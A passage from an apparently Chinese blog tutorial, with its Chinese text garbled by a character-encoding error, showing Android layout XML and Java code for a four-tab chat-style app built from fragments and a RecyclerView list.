class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/find"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"å‘ç°"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/w"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"æˆ‘çš„"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="4ä¸ªfragment-xml"><a href="#4ä¸ªfragment-xml" class="headerlink" title="4ä¸ªfragment.xml"></a>4ä¸ªfragment.xml</h4><p>é€šè¿‡ä¸€ä¸ªxmlæ–‡ä»¶å°†æ ‡é¢˜æ éƒ¨åˆ†å’Œåº•éƒ¨é€‰æ‹©æ éƒ¨åˆ†æ·»åŠ åˆ°ä¸€ä¸ªxmlæ–‡ä»¶é‡Œé¢ï¼Œå†ä¸¤ä¸ªæ–‡ä»¶ä¸­é—´æ·»åŠ ä¸€ä¸ªcontentéƒ¨ä»¶ï¼Œå°†å››ä¸ªfragmentå½“åšå¡ç‰‡å‹å…¥ä¸­é—´ä¸»ä½“éƒ¨åˆ†ã€‚å››ä¸ªfragmentçš„xmlæ–‡ä»¶ç±»ä¼¼ï¼Œæ•…åªæ”¾ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</p><h4 id="fragment-lt-xml"><a href="#fragment-lt-xml" class="headerlink" title="fragment_lt.xml"></a>fragment_lt.xml</h4><p>ç¬¬ä¸€ä¸ªèŠå¤©ç•Œé¢æˆ‘è®¾ç½®åˆ—è¡¨æ•ˆæœï¼Œåªéœ€è¦æ·»åŠ ä¸€ä¸ª recycleview å®ç°åˆ—è¡¨æ•ˆæœå³å¯</p><p><strong>å›¾ç‰‡</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/61eu2EynqloQswm.png'><img src="https://s2.loli.net/2023/10/13/61eu2EynqloQswm.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".ltFragment"</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.recyclerview.widget.RecyclerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/recyclerview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span> /&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>å…¶ä»–3ä¸ªxmlé¡µé¢è®¾ç½®ä¸ºä»‹ç»ç•Œé¢å³å¯ï¼Œæ•ˆæœå’Œä»£ç å¦‚ä¸‹æ‰€ç¤º</p><p><strong>å›¾ç‰‡</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/31QLvmXP4fCwKuY.png'><img src="https://s2.loli.net/2023/10/07/31QLvmXP4fCwKuY.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".ltFragment"</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- <span class="hljs-doctag">TODO:</span> Update blank fragment layout --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"è¿™æ˜¯èŠå¤©ç•Œé¢"</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>ä¸Šæ–‡å·²ç»åœ¨ç›¸åº”çš„ fragment_lt.xml æ–‡ä»¶é‡Œé¢æ·»åŠ äº† recycleviewï¼Œæ­¤æ—¶å†æ·»åŠ ä¸€ä¸ªitem.xmlé¡µé¢ç”¨äºé¡µé¢æ˜¾ç¤ºï¼ŒåªåŒ…å«ä¸€ä¸ªtextview</p><h4 id="item-xml"><a href="#item-xml" class="headerlink" title="item.xml"></a>item.xml</h4><p><strong>å›¾ç‰‡</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/fNWuZhcMX5bKT7A.png'><img src="https://s2.loli.net/2023/10/13/fNWuZhcMX5bKT7A.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/itemview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"TextView"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@android:color/black"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"40sp"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="main-xml"><a href="#main-xml" class="headerlink" title="main.xml"></a>main.xml</h4><p><strong>å›¾ç‰‡</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/xF9R5W23D6QLmYI.png'><img src="https://s2.loli.net/2023/10/07/xF9R5W23D6QLmYI.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".MainActivity"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">layout</span>=<span class="hljs-string">"@layout/top"</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"0dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">layout</span>=<span class="hljs-string">"@layout/bottom"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="3-Javaæ–‡ä»¶ä»£ç ç¼–å†™"><a href="#3-Javaæ–‡ä»¶ä»£ç ç¼–å†™" class="headerlink" title="3. Javaæ–‡ä»¶ä»£ç ç¼–å†™"></a>3. Javaæ–‡ä»¶ä»£ç ç¼–å†™</h3><p>é¦–å…ˆä¾æ¬¡åˆ›å»º4ä¸ªfragement</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/tbo9lg6mc5QpLex.png'><img src="https://s2.loli.net/2023/10/07/tbo9lg6mc5QpLex.png" alt="image.png"></p><p>ä¼šåœ¨ç›¸åº”çš„layoutæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆ4ä¸ª.xmlæ–‡ä»¶</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/hcxenEHgb2JQpdv.png'><img src="https://s2.loli.net/2023/10/07/hcxenEHgb2JQpdv.png" alt="image.png"></p><p>ç›®å‰çš„ç•Œé¢åªæ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ç•Œé¢ï¼Œéœ€è¦å®Œæˆçš„åŠŸèƒ½ä»…æœ‰å±•ç¤ºå’Œé€šè¿‡ç‚¹å‡»éƒ¨ä»¶æ›´æ¢ä¸­é—´éƒ¨åˆ†å±•ç¤ºçš„ç•Œé¢ï¼Œæ‰€ä»¥è¦è€ƒè™‘çš„ä»£ç éƒ¨åˆ†åˆ†åˆ«ä¸ºä»¥ä¸‹å››ä¸ªå†…å®¹ï¼š</p><blockquote><ol><li>ç‚¹å‡»ç›‘å¬éƒ¨åˆ†onclick</li></ol></blockquote><blockquote><ol start="2"><li>å°†4ä¸ªfragmentå‹å…¥contenté‡Œé¢çš„ä»£ç éƒ¨åˆ†</li></ol></blockquote><blockquote><ol start="3"><li>å°†å››ä¸ªå¡ç‰‡éšè—èµ·æ¥çš„ä»£ç éƒ¨åˆ†</li></ol></blockquote><blockquote><ol start="4"><li>å½“ç‚¹å‡»æ—¶å±•ç¤ºçš„ç•Œé¢ä»£ç éƒ¨åˆ†</li></ol></blockquote><p>åˆ›å»º4ä¸ªFrangmentå˜é‡ã€1ä¸ªç®¡ç†å¯¹è±¡FragmentManagerå˜é‡ ã€4ä¸ªLinearLayoutå˜é‡å¯¹è±¡</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Fragment fragment1,fragment2,fragment3,fragment4;<br>    FragmentManager fm;<br>    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;<br></code></pre></td></tr></tbody></table></figure><p>æ–°å»ºä¸€ä¸ªinitalå‡½æ•°ç”¨ä»¥ç»™Fragmenté¡µé¢åˆå§‹åŒ–ï¼Œåœ¨æ­¤å‡½æ•°ä¸­ï¼Œå°†æ­¤å‰å®šä¹‰ä¸ª4ä¸ªFragmentå˜é‡ä½¿ç”¨fragmentManageræ·»åŠ åˆ°mainæ–‡ä»¶ä¸­çš„ä¸­é—´ä¸»ä½“éƒ¨åˆ†çš„å¸ƒå±€ä¸­</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inital</span><span class="hljs-params">()</span> {<br><br>    <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>            .add(R.id.content,fragment1)<br>            .add(R.id.content,fragment2)<br>            .add(R.id.content,fragment3)<br>            .add(R.id.content,fragment4);<br>    ft.commit();<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>åœ¨ç‚¹å‡»å››ä¸ªéƒ¨ä»¶æ—¶éœ€è¦å±•ç¤ºå…¶æ‰€ä»£è¡¨çš„ç•Œé¢ï¼Œæ•…ç¼–å†™æ–°çš„ä¸€ä¸ªå‡½æ•°showfragmentï¼Œå±•ç¤ºfragmentç•Œé¢</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmentshow</span><span class="hljs-params">(Fragment fragment)</span> {<br>       <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>               .show(fragment);<br>       transaction.commit();<br>   }<br></code></pre></td></tr></tbody></table></figure><p>è€Œåœ¨åˆ‡æ¢ç•Œé¢æ—¶ï¼Œéœ€è¦å¯¹åŸå…ˆçš„ç•Œé¢è¿›è¡Œéšè—ä¹‹åå†å±•ç¤ºæ‰€éœ€ç•Œé¢ï¼Œæ•…ç¼–å†™ä¸€ä¸ªæ–°çš„å‡½æ•°fragmentHideï¼Œå°†æ‰€æœ‰çš„fragmentç•Œé¢éƒ½éšè—</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmenthide</span><span class="hljs-params">()</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .hide(fragment1)<br>                .hide(fragment2)<br>                .hide(fragment3)<br>                .hide(fragment4);<br>        ft.commit();<br>    }<br></code></pre></td></tr></tbody></table></figure><p>ä»…å¯¹åº•éƒ¨é€‰æ‹©æ çš„å››ä¸ªæ§ä»¶è¿›è¡Œç›‘å¬ï¼Œå¹¶æ ¹æ®ç›‘å¬æ‰€å¾—åˆ°çš„ç»“æœè°ƒç”¨fragmentç•Œé¢</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">linearLayout1.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout2.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout3.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout4.setOnClickListener(<span class="hljs-built_in">this</span>);<br></code></pre></td></tr></tbody></table></figure><p>æ³¨æ„è¿™é‡Œè®¾ç½®äº†å…¨å±€ç›‘å¬</p><p>å› æ­¤è¦ä¿®æ”¹å’Œè¦†å†™onClickå‡½æ•°</p><p>ä¿®æ”¹æ­¤å¤„</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/MEQiFDCcrvHIzdy.png'><img src="https://s2.loli.net/2023/10/07/MEQiFDCcrvHIzdy.png" alt="image.png"></p><p>è¦†å†™onClickå‡½æ•°</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>        fragmenthide();<br>        <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_wx){<br>            fragmentshow(fragment1);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_friend){<br>            fragmentshow(fragment2);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_address){<br>            fragmentshow(fragment3);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(view.getId()==R.id.id_tab_setting){<br>            fragmentshow(fragment4);<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure><p>è€Œåœ¨æœ€å¼€å§‹çš„ç•Œé¢è‡ªç„¶å°±æ˜¯èŠå¤©ç•Œé¢ï¼Œæ•…åœ¨æœ€å¼€å§‹çš„æ—¶å€™å°±è°ƒç”¨èŠå¤©çš„fragment</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">fragmentshow</span>(fragment1);<br></code></pre></td></tr></tbody></table></figure><hr><p>ç”±äºç‚¹å‡»èŠå¤©è¦å®ç°åˆ—è¡¨åŠŸèƒ½ï¼Œå›ºè¿˜éœ€è¦åœ¨ ltfragment é‡Œé¢å®ç° recycleview åŠŸèƒ½</p><p>æˆ‘ä»¬å…ˆåˆå§‹åŒ–å®šä¹‰ä¸€äº›å˜é‡recyclerViewï¼Œlistï¼Œcontextï¼Œ myadapterï¼ˆä¸€ä¸ªé€‚é…å™¨ï¼‰</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RecyclerView recyclerView;<br><span class="hljs-keyword">private</span> List&lt;String&gt; list;<br><span class="hljs-keyword">private</span> Context context;<br><span class="hljs-keyword">private</span> Myadapter myadapter;<br></code></pre></td></tr></tbody></table></figure><p>ç„¶åæˆ‘ä»¬å¼€å§‹åœ¨onCreateViewï¼ˆï¼‰å‡½æ•°åº•ä¸‹å†™å…¥é€‚é…å™¨éœ€è¦çš„ä¸€äº›å‚æ•°å’Œæ•°æ®ï¼š</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                         Bundle savedInstanceState)</span> {<br>    View view=inflater.inflate(R.layout.fragment_lt,container,<span class="hljs-literal">false</span>);<br>    context=view.getContext();<br>    recyclerView=view.findViewById(R.id.recyclerview);<br>    list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    initData();<span class="hljs-comment">//åˆå§‹åŒ–æ•°æ®</span><br>    LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>    manager.setOrientation(LinearLayoutManager.VERTICAL);<br><br>    myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>    recyclerView.setAdapter(myadapter);<br>    recyclerView.setLayoutManager(manager);<br>    recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>    <span class="hljs-keyword">return</span> view;<br><br>    <span class="hljs-comment">// Inflate the layout for this fragment</span><br>    <span class="hljs-comment">//return inflater.inflate(R.layout.fragment_lt, container, false);</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>åˆ†æä»£ç </p><p>åˆå§‹åŒ–åˆ—è¡¨å†…å®¹</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initData</span><span class="hljs-params">()</span>{<br>        list.add(<span class="hljs-string">"ç½‘å‹1:é’é’å›­ä¸­è‘µ"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹2:æœéœ²å¾…æ—¥æ™"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹3:é˜³æ˜¥å¸ƒå¾·æ³½"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹4:ä¸‡ç‰©ç”Ÿå…‰è¾‰"</span>);<br>        